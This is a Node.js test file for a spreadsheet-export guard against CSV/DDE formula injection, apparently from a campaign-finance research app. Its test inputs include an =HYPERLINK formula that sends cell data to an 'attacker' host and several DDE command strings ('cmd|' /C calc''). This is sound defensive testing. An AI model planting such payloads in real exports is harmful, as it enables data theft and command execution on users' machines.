/* Node test for static/export.js's CSV/DDE formula-injection guard
 * (Security_Recommendations.md Phase 3 MEDIUM finding).
 *
 * BUG: csvCell() implemented RFC-4180 quoting correctly and nothing else.
 * Cell content includes statement excerpts harvested from arbitrary indexed
 * web pages (statements.py) and FEC free-text committee/employer/occupation
 * fields — a crafted `=HYPERLINK("http://attacker/?x="&A1,"click")` or a DDE
 * payload would execute when the researcher opened the export in Excel or
 * LibreOffice.
 *
 * FIX: a leading =, +, -, @, tab, or CR gets a neutralizing leading
 * apostrophe UNLESS the whole value is a plain number — this app exports
 * plenty of legitimate negative figures (refunds, net donor totals) and
 * must not turn "-1500.00" into inert text.
 *
 * Run standalone:      node tests/test_csv_formula_injection.mjs
 * Run with the rest:   bash tests/run_export_tests.sh
 */
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";

const here = dirname(fileURLToPath(import.meta.url));
const src = readFileSync(join(here, "..", "static", "export.js"), "utf8");
(0, eval)(src);
const CT = globalThis.CTExport;

let failures = 0;
const check = (name, cond, detail = "") => {
  console.log(`[${cond ? "PASS" : "FAIL"}] ${name}${detail ? " — " + detail : ""}`);
  if (!cond) failures++;
};

// Whether the encoded cell is neutralized (starts with a guarding
// apostrophe) — the neutralized value may ALSO end up RFC-4180-quoted
// (e.g. it contains a comma too, or the trigger char itself is a CR, which
// forces quoting on its own), in which case the guarding apostrophe sits
// just inside the opening double-quote rather than at position 0.
function isNeutralized(encoded) {
  return encoded.startsWith("'") || encoded.startsWith('"\'');
}

// ── dangerous shapes get neutralized ──────────────────────────────────────
check("Excel formula neutralized",
  isNeutralized(CT.csvCell('=HYPERLINK("http://attacker/?x="&A1,"click")')),
  CT.csvCell('=HYPERLINK("http://attacker/?x="&A1,"click")'));
check("plus-formula neutralized", isNeutralized(CT.csvCell("+1+1")));
check("at-formula (DDE) neutralized", isNeutralized(CT.csvCell("@SUM(1,1)")),
  CT.csvCell("@SUM(1,1)"));
check("leading-tab neutralized", isNeutralized(CT.csvCell("\t=cmd|' /C calc'!A1")));
check("leading-CR neutralized", isNeutralized(CT.csvCell("\r=cmd")),
  CT.csvCell("\r=cmd"));
check("minus-formula (DDE-style command) neutralized",
  isNeutralized(CT.csvCell("-2+3+cmd|' /C calc'!A1")),
  CT.csvCell("-2+3+cmd|' /C calc'!A1"));

// ── the neutralized value still round-trips through quoting when it also
//    needs RFC-4180 quoting (comma/quote/newline) ──────────────────────────
const withComma = CT.csvCell("=cmd,evil");
check("neutralized + comma-quoted together",
  withComma === '"\'=cmd,evil"', withComma);

// ── legitimate negative/positive numbers are NEVER prefixed ──────────────
// This is the regression the audit specifically flagged: a blind "-" guard
// would turn real dollar figures into text on open.
check("plain negative float untouched", CT.csvCell(-1500.5) === "-1500.5");
check("plain negative float (string form) untouched", CT.csvCell("-1500.00") === "-1500.00");
check("plain positive-signed number untouched", CT.csvCell("+42") === "+42");
check("plain integer untouched", CT.csvCell(-7) === "-7");
check("zero untouched", CT.csvCell(0) === "0");
check("small decimal untouched", CT.csvCell("-.5") === "-.5");
check("scientific notation untouched", CT.csvCell("-1.5e10") === "-1.5e10");

// ── values that MERELY start with a number are still dangerous ───────────
// (a real Excel/LibreOffice formula-injection shape can look numeric-ish
// but isn't a plain number the moment it has trailing formula syntax).
check("number-prefixed formula still neutralized",
  isNeutralized(CT.csvCell("-2+cmd|'/C calc'!A1")),
  CT.csvCell("-2+cmd|'/C calc'!A1"));

// ── ordinary text (no leading trigger char) is never touched ─────────────
check("ordinary donor name untouched", CT.csvCell("Smith, John") === '"Smith, John"');
check("ordinary excerpt untouched",
  CT.csvCell("he said money in politics is a problem")
    === "he said money in politics is a problem");
check("null/undefined still empty (not '=')", CT.csvCell(null) === "" && CT.csvCell(undefined) === "");

console.log();
if (failures) {
  console.log(`FAILED: ${failures} check(s)`);
  process.exit(1);
}
console.log("All CSV formula-injection checks passed.");
